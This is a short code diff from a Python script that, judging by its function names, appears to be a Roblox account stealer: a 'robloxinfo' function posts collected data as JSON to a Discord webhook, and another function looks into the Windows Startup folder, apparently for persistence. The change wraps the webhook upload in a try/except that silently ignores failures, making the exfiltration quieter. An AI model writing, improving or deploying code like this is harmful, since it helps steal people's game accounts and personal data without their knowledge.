@@ -57,8 +57,12 @@ def robloxinfo(webhook):
                     "avatar_url": "https://cdn.discordapp.com/attachments/1120798395389444169/1122895649201983519/image-250x250.jpg"
                 }
                 headers = {'Content-Type': 'application/json'}
-                response = requests.post(webhook, headers=headers, data=json.dumps(data))
-                response.raise_for_status()
+                
+                try:
+                    response = requests.post(webhook, headers=headers, data=json.dumps(data))
+                    response.raise_for_status()
+                except requests.exceptions.RequestException:
+                    pass
 
 def get_webhook_from_file():
     startup_folder = os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
